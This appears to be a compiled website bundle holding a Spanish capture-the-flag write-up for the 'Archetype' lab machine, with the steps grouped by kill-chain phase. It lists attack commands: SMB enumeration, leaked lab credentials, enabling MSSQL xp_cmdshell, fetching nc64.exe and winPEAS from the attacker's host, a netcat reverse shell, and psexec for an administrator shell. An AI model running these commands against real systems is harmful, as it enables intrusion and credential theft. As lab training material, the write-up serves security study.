"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2211],{3905:function(e,n,t){t.d(n,{Zo:function(){return p},kt:function(){return m}});var a=t(7294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),c=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},p=function(e){var n=c(e.components);return a.createElement(l.Provider,{value:n},e.children)},u={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},d=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=c(t),m=r,h=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return t?a.createElement(h,s(s({ref:n},p),{},{components:t})):a.createElement(h,s({ref:n},p))}));function m(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,s=new Array(o);s[0]=d;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i.mdxType="string"==typeof e?e:r,s[1]=i;for(var c=2;c<o;c++)s[c]=t[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,t)}d.displayName="MDXCreateElement"},6895:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return i},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return p},default:function(){return d}});var a=t(7462),r=t(3366),o=(t(7294),t(3905)),s=["components"],i={},l=void 0,c={unversionedId:"Cibersecurity/Red Team/Writeups/Archetype THM{}",id:"Cibersecurity/Red Team/Writeups/Archetype THM{}",title:"Archetype THM{}",description:'Debido a que es una maquia inicial y se encuentre ampliamente documentada, en este art\xedculo se resumen los pasos dentro de las fases de la "Cyber Kill Chain" y se escriben los comandos de cada uno.',source:"@site/docs/Cibersecurity/Red Team/Writeups/Archetype THM{}.md",sourceDirName:"Cibersecurity/Red Team/Writeups",slug:"/Cibersecurity/Red Team/Writeups/Archetype THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Archetype THM{}",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Hack with Powershell",permalink:"/docs/Cibersecurity/Red Team/Windows/Hack with Powershell"},next:{title:"Atackive directory THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Atackive directory THM{}"}},p=[{value:"1. Reconnaissance",id:"1-reconnaissance",children:[],level:2},{value:"2. Weaponization",id:"2-weaponization",children:[],level:2},{value:"3. Delivery",id:"3-delivery",children:[],level:2},{value:"4.Exploitation",id:"4exploitation",children:[],level:2},{value:"5. Installation",id:"5-installation",children:[],level:2},{value:"6. Command and Control",id:"6-command-and-control",children:[],level:2},{value:"7. Contain",id:"7-contain",children:[],level:2}],u={toc:p};function d(e){var n=e.components,t=(0,r.Z)(e,s);return(0,o.kt)("wrapper",(0,a.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("p",null,'Debido a que es una maquia inicial y se encuentre ampliamente documentada, en este art\xedculo se resumen los pasos dentro de las fases de la "Cyber Kill Chain" y se escriben los comandos de cada uno.\nPara comprender todos los pasos realizados, es fundamental tener en cuenta que la situaci\xf3n final deseable es acceder a la m\xe1quina objetivo con privilegios de administrador.'),(0,o.kt)("h2",{id:"1-reconnaissance"},"1. Reconnaissance"),(0,o.kt)("p",null,"En esta fase, se ejecuta nmap para enumerar la m\xe1quina objetivo."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-shell"},"nmap -sC -sV {dest-IP}\n")),(0,o.kt)("p",null,"Se observa esta informaci\xf3n significativa:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-shell"},"PORT     STATE SERVICE      VERSION\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds\n1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM\n| ms-sql-ntlm-info: \n|   Target_Name: ARCHETYPE\n|   NetBIOS_Domain_Name: ARCHETYPE\n|   NetBIOS_Computer_Name: ARCHETYPE\n|   DNS_Domain_Name: Archetype\n|   DNS_Computer_Name: Archetype\n|_  Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2021-12-30T18:06:04\n|_Not valid after:  2051-12-30T18:06:04\n|_ssl-date: 2021-12-30T18:13:51+00:00; +10m45s from scanner time.\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n")),(0,o.kt)("p",null,"Posteriormente se enumeran los recursos compartidos por SMB:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-shell"},"smbclient -N -L \\\\\\\\{dest-IP}\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backups         Disk      \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\nSMB1 disabled -- no workgroup available\n")),(0,o.kt)("p",null,"Se accede a backups y se observa en un documento la siguiente informaci\xf3n, que corresponde con el nombre de usuario y la contrase\xf1a del mssql del puerto 1433:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;\n")),(0,o.kt)("h2",{id:"2-weaponization"},"2. Weaponization"),(0,o.kt)("p",null,"En esta fase todo el sofware a utilizar posteriormente ya se encuentra desarrollado y es el siguiente. Aunque se va necesitando seg\xfan se analiza la m\xe1quina, se expone en esta fase para simplificar la comprensi\xf3n."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/SecureAuthCorp/impacket"},"Impacket")," - script mssqlclient.py - Utilizado como cliente mssql para conectarse al servicio con las credenciales encontradas"),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/int0x33/nc.exe/blob/master/nc64.exe"},"nc64.exe")," - Netcat for NT 64 bits - Para conectarse de manera remota al host"),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/carlospolop/PEASS-ng/releases/tag/refs/pull/252/merge"},"winPEASx64.exe")," - Para la escalada de privilegios en Windows con las credenciales de 'administrator'"),(0,o.kt)("li",{parentName:"ol"},"script psexec.py de Impacket, utilzado para obtener una shell como administrador")),(0,o.kt)("h2",{id:"3-delivery"},"3. Delivery"),(0,o.kt)("p",null,"Utilizando las credenciales de mssql, se conecta mediante el script mssqlclient.py de impacket al servidor MSSQL."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"python3 mssqlclient.py ARCHETYPE/sql_svc@{dest-IP} -windows-auth\n")),(0,o.kt)("p",null,"Como se conocen en profundidad las caracter\xedsticas de MSSQL Server que se exponen en los art\xedculos citados a continuaci\xf3n, se comprueba si la opci\xf3n xp_cmdshell est\xe1 activada."),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server"},"Pentesting MSSQL - Microsoft SQL Server")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet"},"MSSQL Injection Cheat Sheet"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"SELECT is_srvrolemember('sysadmin'); #Para comprobar si se tienen permisos de administrador con el usuario ARCHETYPE/sql_svc \n")),(0,o.kt)("p",null,"Como s\xed se tienen, se prueba si xp_cmdshell est\xe1 activada y como no lo est\xe1, se activa de la siguiente forma:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"EXEC xp_cmdshell 'net user'; \u2014 privOn MSSQL 2005 you may need to reactivate xp_cmdshell\nfirst as it\u2019s disabled by default:\nEXEC sp_configure 'show advanced options', 1; \u2014 priv\nRECONFIGURE; \u2014 priv\nEXEC sp_configure 'xp_cmdshell', 1; \u2014 priv\nRECONFIGURE; \u2014 priv\n")),(0,o.kt)("p",null,"A continuaci\xf3n se sube a la m\xe1quina el ejecutable nc64.exe mediante wget"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"}," # En el host\nsudo python3 -m http.server 80  #Se prepara un servidor http en la misma carpeta que contiene el ejecutable\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},' # En la m\xe1quina\nSQL> xp_cmdshell "powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://host-IP/nc64.exe -outfile nc64.exe"\n')),(0,o.kt)("p",null,"Ahora se pone en modo escucha Netcat en el host por el puerto 443"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"nc -lvnp 443\n")),(0,o.kt)("h2",{id:"4exploitation"},"4.Exploitation"),(0,o.kt)("p",null,"En esta fase, se contempla tanto la explotaci\xf3n de la m\xe1quina como la escalada de privilegios.\nA continuaci\xf3n se abre una shell desde la m\xe1quina usando nc64.exe"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'SQL> xp_cmdshell "powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe host-IP 443"\n')),(0,o.kt)("p",null,"Una vez hecho este paso, posemos encontrar el flag de usuario en el escritorio."),(0,o.kt)("p",null,"Para la escalada de privilegios, hacemos uso de winPEASx64.exe, subi\xe9ndolo igual que el otro ejecutable."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"powershell\nwget http://host-IP/winPEASx64.exe -outfile winPEASx64.exe\n")),(0,o.kt)("p",null,"Se ejecuta y de toda la informaci\xf3n mostrada, destaca la expuesta"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},".\\winPEASx64.exe\n\n SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED  #Permite la escalada de privilegios de diferentes formas\n\n")),(0,o.kt)("p",null,"De la misma forma que .bash_history, PowerShell tiene otro historial llamado ConsoleHost_history.txt que se encuentra en"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\\n")),(0,o.kt)("p",null,"Si se accede, se ecuentra lo siguiente: /user:administraror MEGACORP_4dm1n!!\nPor lo que haciendo uso de la contrase\xf1a y el script psexec.py, obtenemos una shell de administrador en la m\xe1quina"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"python3 psexec.py administrator@{TARGET_IP}\n")),(0,o.kt)("p",null,"Y como siempre, en el escritorio, encontramos la flag :)"),(0,o.kt)("p",null,"Debido a que no se obtiene persistencia ni se borran las pruebas, las siguientes fases no se llevan a cabo"),(0,o.kt)("h2",{id:"5-installation"},"5. Installation"),(0,o.kt)("h2",{id:"6-command-and-control"},"6. Command and Control"),(0,o.kt)("h2",{id:"7-contain"},"7. Contain"))}d.isMDXComponent=!0}}]);